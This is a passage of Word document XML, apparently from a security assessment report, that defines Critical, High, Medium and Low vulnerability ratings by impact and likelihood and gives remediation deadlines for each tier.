        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Critical</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Critical-priority issues have high impact and high likelihood. Critical-priority issues are easy to</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Detect</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and exploit and result in large asset damage. These issues represent the highest security</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Risk</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to the application. As such, they should be remediated prior to the go live date for applications</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Or</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> functionalities not yet in production. Applications with vulnerabilities already in production should</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Fix</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> critical priority issues within 5 days from the Preliminary Report date.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>High</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>High-priority issues have high impact and low likelihood. High-priority issues are often difficult to</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Detect</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and exploit, but can result in large asset damage. These issues represent a high security risk</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>To</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> the application. High-priority issues should be remediated prior to the go live date for</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Applications</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or functionalities not yet in production. Applications with vulnerabilities already in</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Production</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> have 30 days from the Preliminary Report date to fix high priority issues.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Medium</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Medium-priority issues have low impact and high likelihood. Medium-priority issues are easy to</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Detect</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and exploit, but typically result in small asset damage. These issues represent a moderate</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Security</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> risk to the application. Medium-priority issues should be remediated prior to the go live date</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>For</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> applications or functionalities not yet in production. Applications with vulnerabilities already in</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Production</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> have 60 days from the Preliminary Report date to fix Medium priority issues.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Low</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Low-priority issues have low impact and low likelihood. Low-priority issues can be difficult to detect</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00426336" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>And</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit and typically result in small asset damage. These issues represent a minor security risk</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00426336" w:rsidP="000C13B7">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>To</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> the application. Low-priority issues should be remediated in the next scheduled product update.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7366" w:rsidRPr="00802CE3" w:rsidRDefault="006C7366" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006C7366" w:rsidRPr="00802CE3" w:rsidRDefault="006C7366" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="006C7366" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
